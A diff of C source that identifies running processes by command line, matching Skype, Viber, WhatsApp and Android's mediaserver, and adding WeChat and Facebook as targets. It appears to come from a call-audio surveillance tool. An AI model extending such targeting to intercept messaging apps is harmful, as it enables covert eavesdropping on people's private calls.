@@ -89,13 +89,17 @@ char local_started=0;
 #define PRG_VIBER_ID 0x0148
 #define PRG_WHATSAPP_ID 0x014b
 #define PRG_WECHAT_ID 0x0149
+#define PRG_FB_ID 0x014c
 #define PRG_MEDIASERVER_ID 0x1
+
 
 #define MAX_STRLEN 50
 enum{
 	POS_SKYPE=0,
 	POS_VIBER,
 	POS_WHATSAPP,
+	POS_WECHAT,
+	POS_FACEBOOK,
 	POS_MEDIA,
 	POS_RET,
 	POS_MAX
@@ -105,6 +109,8 @@ const char *pid_name[]={
 		"com.skype.raider",
 		"com.viber.voip",
 		"com.whatsapp",
+		"com.tencent.mm",
+		"com.facebook.",
 		"/system/bin/mediaserver",
 		"unknown"
 };
@@ -148,24 +154,32 @@ int get_command_id(int pid) {
 			}
 			last_pid_lookup[POS_RET] = pid;
 			if(strncmp(cmdline,pid_name[POS_SKYPE],16) == 0) {
-				last_pid_lookup[POS_SKYPE] = pid;
-				last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_SKYPE] = PRG_SKYPE_ID;
-				last_found=POS_SKYPE;
+			   last_pid_lookup[POS_SKYPE] = pid;
+			   last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_SKYPE] = PRG_SKYPE_ID;
+			   last_found=POS_SKYPE;
 			}else  if(strncmp(cmdline, pid_name[POS_VIBER],14) == 0) {
-				last_pid_lookup[POS_VIBER] = pid;
-				last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_VIBER] = PRG_VIBER_ID;
-				last_found=POS_VIBER;
+			   last_pid_lookup[POS_VIBER] = pid;
+			   last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_VIBER] = PRG_VIBER_ID;
+			   last_found=POS_VIBER;
 			}else  if(strncmp(cmdline, pid_name[POS_WHATSAPP],12) == 0) {
-                           last_pid_lookup[POS_WHATSAPP] = pid;
-                           last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_WHATSAPP] = PRG_WHATSAPP_ID;
-                           last_found=POS_WHATSAPP;
-                        }else  if(strncmp(cmdline,pid_name[POS_MEDIA],23) == 0) {
-				last_pid_lookup[POS_MEDIA] = pid;
-				last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_MEDIA] = PRG_MEDIASERVER_ID;
-				last_found=POS_MEDIA;
+			   last_pid_lookup[POS_WHATSAPP] = pid;
+			   last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_WHATSAPP] = PRG_WHATSAPP_ID;
+			   last_found=POS_WHATSAPP;
+			}else  if(strncmp(cmdline, pid_name[POS_WECHAT],14) == 0) { //com.tencent.mm
+                           last_pid_lookup[POS_WECHAT] = pid;
+                           last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_WECHAT] = PRG_WECHAT_ID;
+                           last_found=POS_WECHAT;
+                        }else  if(strncmp(cmdline, pid_name[POS_FACEBOOK],13) == 0) {
+			   last_pid_lookup[POS_FACEBOOK] = pid;
+			   last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_FACEBOOK] = PRG_FB_ID;
+			   last_found=POS_FACEBOOK;
+			}else  if(strncmp(cmdline,pid_name[POS_MEDIA],23) == 0) {
+			   last_pid_lookup[POS_MEDIA] = pid;
+			   last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_MEDIA] = PRG_MEDIASERVER_ID;
+			   last_found=POS_MEDIA;
 			}else{
-				last_pid_lookup_res[POS_RET] = PRG_UNKNOWN_ID;
-				last_found=POS_RET;
+			   last_pid_lookup_res[POS_RET] = PRG_UNKNOWN_ID;
+			   last_found=POS_RET;
 			}
 
 		} else {
